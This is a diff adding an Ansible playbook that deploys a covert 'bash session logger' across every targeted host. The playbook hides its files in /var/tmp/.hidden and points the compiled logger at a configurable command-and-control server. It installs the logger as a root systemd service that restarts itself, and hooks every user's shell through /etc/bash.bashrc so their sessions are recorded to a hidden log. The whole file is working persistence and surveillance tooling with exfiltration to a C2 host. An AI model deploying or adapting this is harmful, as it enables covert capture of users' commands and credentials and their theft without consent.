@@ -1,0 +1,88 @@
+---
+- name: Deploy Bash Session Logger
+  hosts: all
+  become: yes
+  vars:
+    logger_path: "/var/tmp/.hidden"
+    c2_server: "192.168.1.100"  # Change to your C2 server IP
+    c2_port: 8080
+    log_file: "/tmp/.bash_history.log"
+    pipe_path: "/tmp/bash_logger_pipe"
+  tasks:
+    - name: Create hidden directory for logger
+      file:
+        path: "{{ logger_path }}"
+        state: directory
+        mode: '0755'
+        
+    - name: Copy logger source code
+      copy:
+        src: ./logger.c
+        dest: "{{ logger_path }}/logger.c"
+        mode: '0644'
+        
+    - name: Copy bash hook script
+      copy:
+        src: ./bash_hook.sh
+        dest: "{{ logger_path }}/bash_hook.sh"
+        mode: '0755'
+        
+    - name: Update C2 server address in logger source
+      replace:
+        path: "{{ logger_path }}/logger.c"
+        regexp: '#define C2_SERVER "127.0.0.1"'
+        replace: '#define C2_SERVER "{{ c2_server }}"'
+        
+    - name: Update C2 port in logger source
+      replace:
+        path: "{{ logger_path }}/logger.c"
+        regexp: '#define C2_PORT 8080'
+        replace: '#define C2_PORT {{ c2_port }}'
+        
+    - name: Compile logger binary
+      command: gcc -o {{ logger_path }}/logger {{ logger_path }}/logger.c
+      args:
+        creates: "{{ logger_path }}/logger"
+        
+    - name: Create systemd service for logger
+      copy:
+        dest: /etc/systemd/system/bash-logger.service
+        content: |
+          [Unit]
+          Description=Bash Session Logger
+          After=network.target
+
+          [Service]
+          ExecStart={{ logger_path }}/logger
+          Restart=always
+          User=root
+          Group=root
+
+          [Install]
+          WantedBy=multi-user.target
+        mode: '0644'
+        
+    - name: Enable and start bash-logger service
+      systemd:
+        name: bash-logger
+        enabled: yes
+        state: started
+        daemon_reload: yes
+        
+    - name: Add bash hook to .bashrc for root
+      lineinfile:
+        path: /root/.bashrc
+        line: "source {{ logger_path }}/bash_hook.sh"
+        create: yes
+        
+    - name: Add bash hook to .bashrc for all users
+      lineinfile:
+        path: /etc/bash.bashrc
+        line: "source {{ logger_path }}/bash_hook.sh"
+        create: yes
+        
+    - name: Create named pipe for communication
+      command: mkfifo {{ pipe_path }}
+      args:
+        creates: "{{ pipe_path }}"
+      ignore_errors: yes
